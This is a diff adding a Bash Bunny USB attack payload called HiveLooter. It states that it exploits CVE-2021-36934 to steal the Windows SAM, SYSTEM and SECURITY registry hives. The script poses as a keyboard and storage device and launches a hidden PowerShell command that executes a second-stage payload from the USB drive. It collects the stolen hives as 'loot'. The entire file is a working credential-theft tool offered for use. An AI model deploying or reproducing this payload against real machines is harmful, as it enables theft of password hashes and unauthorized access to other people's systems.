@@ -1,0 +1,25 @@
+#!/bin/bash
+#
+# Title:         HiveLooter
+# Author:        9o3
+# Twitter:       @BugBot4
+# Version:       1.0
+#
+# Leverages CVE-2021–36934 to steal SAM/SYSTEM/SECURITY hives.
+
+LED SETUP
+
+ATTACKMODE HID STORAGE
+GET SWITCH_POSITION
+mkdir -p /root/loot/HiveLooter
+
+LED ATTACK
+RUN WIN "powershell -w 1 -NoP iex(gc((gwmi win32_volume -f 'label=''BashBunny''').Name+'\payloads\\$SWITCH_POSITION\p')-Raw)"
+
+until [ -f /root/udisk/loot/HiveLooter/DONE ]
+do
+	sleep 0.2
+done
+rm /root/udisk/loot/HiveLooter/DONE
+sync
+LED FINISH
